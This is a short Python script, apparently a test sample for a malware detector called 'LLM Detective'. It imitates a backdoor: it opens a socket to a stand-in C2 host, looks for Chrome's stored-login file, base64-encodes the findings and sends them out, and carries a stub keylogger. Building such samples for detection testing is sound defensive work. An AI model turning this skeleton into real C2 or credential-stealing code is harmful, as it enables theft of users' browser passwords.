# Simulated malicious Python script for testing LLM Detective
# This is NOT real malware - for TESTING purposes only

import socket
import base64
import os

# Config - simulated C2 server
C2_SERVER = "evil.lazarus.example.com"
C2_PORT = 8080

def establish_backdoor():
    """Connect to C2 and await commands"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((C2_SERVER, C2_PORT))
    return sock

def steal_credentials():
    """Harvest browser passwords"""
    # Simulated credential theft
    creds = []
    chrome_path = os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data"
    if os.path.exists(chrome_path):
        creds.append(f"Found Chrome: {chrome_path}")
    return creds

def exfiltrate(data, sock):
    """Send stolen data to C2"""
    encoded = base64.b64encode(str(data).encode())
    sock.send(encoded)

def keylogger():
    """Capture keystrokes - simulated"""
    # This would hook keyboard in real malware
    pass

if __name__ == "__main__":
    # Auto-execute on import
    connection = establish_backdoor()
    stolen = steal_credentials()
    exfiltrate(stolen, connection)
    keylogger()
